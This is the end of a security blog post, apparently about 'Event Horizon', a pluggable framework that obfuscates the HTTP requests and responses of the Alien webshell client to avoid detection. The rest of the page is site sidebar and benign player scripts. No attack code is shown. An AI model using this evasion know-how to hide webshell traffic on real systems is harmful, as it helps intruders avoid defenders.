+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This article introduced <strong>Event Horizon</strong>, the obfuscation framework used by Alien.</p>
+<p>Unlike traditional OneShell clients that rely on static loaders, Event Horizon separates the obfuscation logic from the client itself. By treating obfuscation as a pluggable component, users can freely implement their own tamper algorithms without modifying Alien.</p>
+<p>Another important feature of Event Horizon is bilateral obfuscation. Both HTTP requests and responses can be transformed automatically, allowing the communication channel to be customized according to different environments.</p>
+<p>Although the current implementation focuses on OneShells, the framework itself is designed to be extensible. Additional scripting languages, obfuscation algorithms, and communication strategies can all be integrated in future versions.</p>
+<p>Feedback and suggestions are always welcome!</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/Wallpaper/starnight.png'><img src="/images/meme/Wallpaper/starnight.png" width=700/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/07/21/2026-7-21-Webshell-Part3/">[Learning] Inside Different Generations of WebShells (Part 3: Java and C#) Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Issues-of-Detection"><span class="toc-number">2.</span> <span class="toc-text">Issues of Detection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Existing-Solutions"><span class="toc-number">3.</span> <span class="toc-text">Existing Solutions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Event-Horizon"><span class="toc-number">4.</span> <span class="toc-text">Event Horizon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bilateral-Obfuscation"><span class="toc-number">5.</span> <span class="toc-text">Bilateral Obfuscation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Request-Obfuscation"><span class="toc-number">5.1.</span> <span class="toc-text">Request Obfuscation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Response-Obfuscation"><span class="toc-number">5.2.</span> <span class="toc-text">Response Obfuscation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-Write-a-Tampering-Script"><span class="toc-number">5.3.</span> <span class="toc-text">How to Write a Tampering Script</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">7.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
